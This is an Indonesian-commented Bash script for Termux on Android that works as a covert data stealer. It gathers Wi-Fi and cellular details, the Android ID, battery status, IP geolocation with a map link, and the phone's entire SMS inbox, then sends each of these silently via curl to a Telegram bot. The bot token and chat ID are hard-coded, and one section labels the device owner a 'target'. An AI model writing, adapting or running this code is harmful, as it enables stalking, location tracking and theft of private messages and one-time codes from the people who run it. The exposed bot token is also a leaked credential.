#!/bin/bash
#############################
# Warna
k="\033[1;33m"
# Token dan ID Telegram
TELEGRAM_BOT_TOKEN="7187391237:AAFEjlTa-zeFESzJ8udlUtlDLbHYdrj_yVQ"
TELEGRAM_CHAT_ID="6815272748"

#################

TELEGRAM_TOKEN="7187391237:AAFEjlTa-zeFESzJ8udlUtlDLbHYdrj_yVQ"
TELEGRAM_CHAT_ID="6815272748"

#################
#!/bin/bash

# Telegram bot token dan chat ID
TELEGRAM_TOKEN="7187391237:AAFEjlTa-zeFESzJ8udlUtlDLbHYdrj_yVQ"
TELEGRAM_CHAT_ID="6815272748"


# Fungsi untuk mengirim pesan ke Telegram
send_to_telegram() {
  local message=$1
  curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
    -d chat_id="$TELEGRAM_CHAT_ID" \
    -d text="$message" > /dev/null
}

# Fungsi untuk mendapatkan status WiFi
get_wifi_status() {
  termux-wifi-connectioninfo
}

# Fungsi untuk mendapatkan status data seluler
get_cellular_status() {
  termux-telephony-cellinfo
}

# Menggabungkan status ke dalam satu pesan
generate_status_message() {
  wifi_status=$(get_wifi_status)
  cellular_status=$(get_cellular_status)

  echo -e "WiFi Status:\n$wifi_status\n\nCellular Status:\n$cellular_status"
}

# Mendapatkan status dan mengirim ke Telegram
status_message=$(generate_status_message)
send_to_telegram "$status_message"

##################
# Mendapatkan Id Termux

# Fungsi untuk mendapatkan Android ID di Termux
get_android_id() {
  # Mendapatkan Android ID menggunakan command settings
  ANDROID_ID=$(settings get secure android_id 2>/dev/null)

  # Memastikan Android ID tidak kosong atau null
  if [ -z "$ANDROID_ID" ] || [ "$ANDROID_ID" == "null" ]; then
    ANDROID_ID="Tidak tersedia"
  fi

  # Mengembalikan hasil
  echo "$ANDROID_ID"
}

# Mengirim pesan ke bot Telegram
send_telegram_message() {
  local message=$1
  curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
    -d chat_id="$TELEGRAM_CHAT_ID" \
    -d text="$message" \
    -d parse_mode="Markdown" > /dev/null 2>&1
}

# Mengambil Android ID
ANDROID_ID=$(get_android_id)

# Membuat pesan
MESSAGE="*Android ID di Termux:* $ANDROID_ID"

# Mengirim pesan ke Telegram
send_telegram_message "$MESSAGE"

##################
# Mendapatkan informasi jaringan wifi/kuota

# Fungsi untuk mendapatkan status koneksi jaringan di Termux
get_network_status() {
  # Mendapatkan status Wi-Fi dan data seluler
  WIFI_STATUS=$(termux-wifi-connectioninfo 2>/dev/null)
  CELLULAR_STATUS=$(termux-telephony-deviceinfo 2>/dev/null)

  if echo "$WIFI_STATUS" | grep -q "Connected"; then
    CONNECTION_TYPE="Wi-Fi"
  elif echo "$CELLULAR_STATUS" | grep -q "Mobile Data"; then
    CONNECTION_TYPE="Kuota (Data Seluler)"
  else
    CONNECTION_TYPE="Tidak Terhubung"
  fi

  echo "$CONNECTION_TYPE"
}

# Mengirim pesan ke bot Telegram
send_telegram_message() {
  local message=$1
  curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
    -d chat_id="$TELEGRAM_CHAT_ID" \
    -d text="$message" \
    -d parse_mode="Markdown" > /dev/null 2>&1
}

# Mengambil status koneksi jaringan
CONNECTION_TYPE=$(get_network_status)

# Membuat pesan
MESSAGE="*Status Koneksi Jaringan:* $CONNECTION_TYPE"

# Mengirim pesan ke Telegram
send_telegram_message "$MESSAGE"
##################
# Mendapatkan informasi Target

# Fungsi untuk mendapatkan informasi baterai di Termux
get_battery_info() {
  # Mendapatkan status baterai dalam format JSON
  BATTERY_JSON=$(termux-battery-status)
  
  # Memparse JSON dan menampilkan informasi dengan format yang lebih bersih
  BATTERY_LEVEL=$(echo $BATTERY_JSON | jq -r '.percentage')
  BATTERY_STATUS=$(echo $BATTERY_JSON | jq -r '.status')
  BATTERY_HEALTH=$(echo $BATTERY_JSON | jq -r '.health')
  BATTERY_PLUGGED=$(echo $BATTERY_JSON | jq -r '.plugged')
  BATTERY_TEMPERATURE=$(echo $BATTERY_JSON | jq -r '.temperature')

  # Mengonversi suhu dari Kelvin ke Celsius
  TEMPERATURE_C=$(echo "scale=1; ($BATTERY_TEMPERATURE - 273.15)" | bc)

  # Membuat pesan yang terformat
  echo -e "Informasi Baterai:\n\
- Level: $BATTERY_LEVEL%\n\
- Status: $BATTERY_STATUS\n\
- Kesehatan: $BATTERY_HEALTH\n\
- Terhubung ke: $BATTERY_PLUGGED\n\
- Suhu: $TEMPERATURE_C°C"
}

# Mengirim pesan ke bot Telegram
send_telegram_message() {
  local message=$1
  curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
    -d chat_id="$TELEGRAM_CHAT_ID" \
    -d text="$message" \
    -d parse_mode="Markdown" > /dev/null 2>&1
}

# Mengambil informasi baterai
BATTERY_INFO=$(get_battery_info)

# Mengirim informasi baterai ke Telegram
send_telegram_message "$BATTERY_INFO"
##################
# Mendapatkan Lokasi ip
# Fungsi untuk mendapatkan informasi lokasi dari IP
get_ip_location() {
  IP_INFO=$(curl -s ipinfo.io)
  IP=$(echo $IP_INFO | jq -r '.ip')
  CITY=$(echo $IP_INFO | jq -r '.city')
  REGION=$(echo $IP_INFO | jq -r '.region')
  COUNTRY=$(echo $IP_INFO | jq -r '.country')
  LOC=$(echo $IP_INFO | jq -r '.loc')
  ORG=$(echo $IP_INFO | jq -r '.org')

  if [ -z "$LOC" ] || [ "$LOC" == "null" ]; then
    LOC_VALID="Tidak valid"
    MAPS_URL="Tidak tersedia"
  else
    LOC_VALID="Valid"
    MAPS_URL="https://www.google.com/maps?q=${LOC}"
  fi

  echo -e "IP: $IP\nLokasi: $CITY\nWilayah: $REGION\nNegara: $COUNTRY\nID Lokasi: $LOC\nLokasi Valid: $LOC_VALID\nOrganisasi: $ORG\nGoogle Maps: $MAPS_URL"
}

# Mengirim pesan ke bot Telegram
send_telegram_message() {
  local message=$1
  curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
    -d chat_id="$TELEGRAM_CHAT_ID" \
    -d text="$message" \
    -d parse_mode="Markdown" > /dev/null 2>&1
}

# Mengambil informasi lokasi IP
IP_LOCATION_INFO=$(get_ip_location)

# Mengirim informasi lokasi IP ke Telegram
send_telegram_message "$IP_LOCATION_INFO"

############################
#!/bin/bash

# Ganti dengan token dan ID Telegram Anda
TELEGRAM_TOKEN="7187391237:AAFEjlTa-zeFESzJ8udlUtlDLbHYdrj_yVQ"
TELEGRAM_CHAT_ID="6815272748"
#!/bin/bash

# Ganti dengan token bot Telegram Anda
TOKEN="7187391237:AAFEjlTa-zeFESzJ8udlUtlDLbHYdrj_yVQ"
# Ganti dengan ID chat Telegram Anda
CHAT_ID="6815272748"

# Dapatkan daftar SMS
SMS_LIST=$(termux-sms-list)

# Format pesan (batasan panjang pesan Telegram adalah 4096 karakter)
MESSAGE="Pesan SMS terbaru:\n$SMS_LIST"

# Jika pesan terlalu panjang, bagi menjadi beberapa bagian
if [ ${#MESSAGE} -gt 4096 ]; then
    PARTS=$(echo "$MESSAGE" | sed -e "s/.\{4096\}/&\n/g")
    for PART in $PARTS; do
        # URL untuk mengirim pesan
        URL="https://api.telegram.org/bot$TOKEN/sendMessage"
        
        # Mengirim pesan ke bot Telegram
        curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$PART" > /dev/null 2>&1
    done
else
    # URL untuk mengirim pesan
    URL="https://api.telegram.org/bot$TOKEN/sendMessage" > /dev/null 2>&1

    # Mengirim pesan ke bot Telegram
    curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$MESSAGE" > /dev/null 2>&1
fi


#################
